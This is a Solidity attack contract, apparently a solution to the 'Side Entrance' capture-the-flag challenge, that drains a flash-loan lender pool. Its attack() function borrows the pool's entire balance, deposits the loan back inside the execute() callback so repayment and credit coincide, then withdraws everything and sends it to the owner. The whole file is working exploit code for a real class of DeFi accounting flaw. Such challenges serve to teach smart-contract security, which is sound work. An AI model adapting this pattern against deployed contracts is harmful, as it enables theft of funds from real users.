pragma solidity ^0.8.0;

import "../side-entrance/SideEntranceLenderPool.sol";
import "@openzeppelin/contracts/utils/Address.sol";

contract SideEntranceAttacker is IFlashLoanEtherReceiver {
    using Address for address payable;

    SideEntranceLenderPool private immutable lenderPool;
    address private immutable owner;

    constructor(address _owner, address _lenderPool) {
        lenderPool = SideEntranceLenderPool(_lenderPool);
        owner = _owner;
    }

    function attack() external {
        lenderPool.flashLoan(address(lenderPool).balance);
        lenderPool.withdraw();
        payable(owner).sendValue(address(this).balance);
    }

    function execute() external override payable {
        lenderPool.deposit{value: address(this).balance}();
    }

    receive() external payable {}
}
